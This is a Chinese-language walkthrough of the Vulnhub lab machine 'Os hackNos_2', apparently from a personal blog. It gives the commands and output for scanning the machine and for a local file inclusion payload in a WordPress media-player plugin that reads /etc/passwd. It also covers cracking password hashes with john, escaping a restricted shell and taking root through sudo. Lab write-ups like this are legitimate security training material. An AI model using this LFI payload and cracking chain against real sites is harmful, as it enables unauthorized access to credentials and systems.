---
layout: post
title: "Os hackNos_2 walkthrough"
date: 2021-06-27
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机        | IP               |
| ------------- | ---------------- |
| 本机（Win10） | `192.168.36.234` |
| Kali          | `192.168.36.89`  |
| OS-hackNos-2  | `192.168.36.54`  |

### 扫描端口和版本信息

`nmap -A 192.168.36.54`

```shell
┌──(root💀kali)-[~]
└─# nmap -A 192.168.36.54
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-27 14:13 UTC
Nmap scan report for 192.168.36.54
Host is up (0.021s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)
|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)
|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: A8:66:7F:1B:19:D8 (Apple)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

从结果中知道靶机开启**22**、**80**端口，信息比较简单，接下来进行目录枚举

### 枚举目录

```shell
┌──(root💀kali)-[~]
└─# dirb http://192.168.36.54/
...
---- Scanning URL: http://192.168.36.54/ ----
+ http://192.168.36.54/index.html (CODE:200|SIZE:10918)
+ http://192.168.36.54/server-status (CODE:403|SIZE:278)
==> DIRECTORY: http://192.168.36.54/tsweb/

---- Entering directory: http://192.168.36.54/tsweb/ ----
+ http://192.168.36.54/tsweb/index.php (CODE:301|SIZE:0)
==> DIRECTORY: http://192.168.36.54/tsweb/wp-admin/
==> DIRECTORY: http://192.168.36.54/tsweb/wp-content/
==> DIRECTORY: http://192.168.36.54/tsweb/wp-includes/
+ http://192.168.36.54/tsweb/xmlrpc.php (CODE:200|SIZE:0)
```

结果显示在网站目录*/tsweb*下运行的是WordPress CMS，知道这个信息就行了，接着用*wpscan*工具进行扫描即可。先试试枚举用户

> 注意网站路径，需要加上*/tsweb*

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.36.54/tsweb -e u
________________________________________________
...
[i] User(s) Identified:

[+] user
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.36.54/tsweb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
...
```

结果不尽如意，那么再看看WordPress使用了哪些插件

```shell
┌──(root💀kali)-[~]
└─# wpscan --url http://192.168.36.54/tsweb/ -e ap
___________________________________________________
...
[i] Plugin(s) Identified:

[+] gracemedia-media-player
 | Location: http://192.168.36.54/tsweb/wp-content/plugins/gracemedia-media-player/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2013-07-21T15:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.36.54/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.36.54/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
...
```

结果显示使用了**gracemedia-media-player**插件，并且版本号为**1.0**。*searchsploit*工具搜索没有结果，google搜索后发现该版本下存在LFI漏洞，详情以及PoC可[在这查看](https://seclists.org/fulldisclosure/2019/Mar/26
)，漏洞点在*ajax_controller.php*文件中`require_once($_GET['cfg']);`，*cfg*参数存在LFI漏洞，因此本实验PoC如下：

```http
http://192.168.36.54/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

从返回结果的*passwd*文件中发现存在用户名为*flag*和它密码的hash：`flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash`，并且从中可以知道该用户使用的shell为**rbash**，因此在后续步骤中需要将**rbash** shell却换成**bash**。不过在此之前需要对密码进行hash破解。

### 密码破解

使用*john*的密码本模式进行hash破解，命令如下：

```shell
┌──(root💀kali)-[~]
└─# john --wordlist=/usr/share/wordlists/Passwords/Leaked-Databases/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
topsecret        (flag)
1g 0:00:00:00 DONE (2021-06-27 15:01) 4.347g/s 28382p/s 28382c/s 28382C/s princess07..micky
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

至此我们知道了用户*flag*的密码*topsecret*，使用该用户名和密码登录WordPress后台时发现不行，尝试后发现是进行ssh登录，其实从之前的*passwd*文件中就可以看出来。

### Restricted shell绕过

受限的shell 也是一个Linux shell，从名称中就可以知道该shell是限制了bash shell的一些功能。Restricted shell用于某些特定场景，对普通用户使用而言就不合适，可以阅读[这篇文章](https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/)进行**rbash** shell绕过。

ssh登录命令改为：`ssh flag@192.168.36.54 -t "bash --noprofile"`，这样该用户使用的shell就会切换成*bash*。经过一番探索后发现靶机*/home*目录下只存在一个*rohit*用户，并且也未查找到有用的具备SUID权限的文件。

```shell
flag@hacknos:/home$ ls
rohit
flag@hacknos:/home$ id
uid=1001(flag) gid=1003(flag) groups=1003(flag)
flag@hacknos:/home$ sudo -l
[sudo] password for flag:
Sorry, user flag may not run sudo on hacknos.
flag@hacknos:/home$ cd rohit
flag@hacknos:/home/rohit$ ls
ls: cannot open directory '.': Permission denied
```

最终在*/var/backups/passbkp/*目录下发现*rohit*账户的密码hash值。​与之前一致，*john*爆破后得到的密码是：`!%hack41`。切换到*rohit*用户在该用户主目录下找到第一个flag。

```shell
rohit@hacknos:~$ cat user.txt
############################################
 __    __   _______   ______    ______
/  |  /  | /       | /      \  /      \
$$ |  $$ |/$$$$$$$/ /$$$$$$  |/$$$$$$  |
$$ |  $$ |$$      \ $$    $$ |$$ |
$$ \__$$ | $$$$$$  |$$$$$$$$/ $$ |
$$    $$/ /     $$/ $$       |$$ |
 $$$$$$/  $$$$$$$/   $$$$$$$/ $$/



############################################

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

查看该用户具备的权限时发现可执行任意命令。额~，之后的步骤就简单了。

```shell
rohit@hacknos:~$ sudo passwd root
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
rohit@hacknos:~$ su - root
Password:
root@hacknos:~# ls
root.txt
root@hacknos:~# cat root.txt
 _______                         __              __  __     #
/       \                       /  |            /  |/  |    #
$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  #
$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
#############################################################                                                     

#############################################################                                                     
MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
```

